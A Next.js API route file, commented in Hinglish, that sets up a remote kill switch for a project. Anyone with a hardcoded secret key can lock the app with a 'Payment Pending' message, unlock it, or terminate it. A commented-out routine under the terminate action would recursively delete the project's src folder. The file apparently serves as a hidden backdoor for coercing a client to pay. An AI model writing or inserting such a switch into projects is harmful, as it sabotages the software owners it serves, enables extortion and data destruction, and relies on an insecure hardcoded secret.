import { NextResponse } from 'next/server';
import { setProjectStatus, ProjectStatus } from '@/lib/project-status';
import fs from 'fs';
import path from 'path';

// Aap apna koi bhi secret key yahan set kar sakte hain
const SYSTEM_SECRET = "MERA_SECRET_12345"; 

export async function POST(req: Request) {
  try {
    const { key, action, message } = await req.json();

    if (key !== SYSTEM_SECRET) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    if (action === 'LOCK') {
      setProjectStatus('LOCKED', message || "Payment Pending");
      return NextResponse.json({ success: true, message: "Project Locked Successfully" });
    }

    if (action === 'UNLOCK') {
      setProjectStatus('ACTIVE');
      return NextResponse.json({ success: true, message: "Project Unlocked Successfully" });
    }

    if (action === 'TERMINATE') {
      // YE NUCLEAR OPTION HAI - ISSE FILES DELETE HO SAKTI HAIN
      // Abhi ke liye hum sirf status change kar rahe hain
      setProjectStatus('TERMINATED', "This project has been decommissioned.");
      
      /* 
      DANGER: Delete logic (Commented for safety)
      const srcDir = path.join(process.cwd(), 'src');
      const deleteFolderRecursive = (directoryPath: string) => {
        if (fs.existsSync(directoryPath)) {
          fs.readdirSync(directoryPath).forEach((file) => {
            const curPath = path.join(directoryPath, file);
            if (fs.lstatSync(curPath).isDirectory()) {
              deleteFolderRecursive(curPath);
            } else {
              fs.unlinkSync(curPath);
            }
          });
          fs.rmdirSync(directoryPath);
        }
      };
      // deleteFolderRecursive(srcDir); 
      */

      return NextResponse.json({ success: true, message: "Project Terminated. Files are safe for now, but access is gone." });
    }

    return NextResponse.json({ error: "Invalid Action" }, { status: 400 });

  } catch (error) {
    return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
  }
}
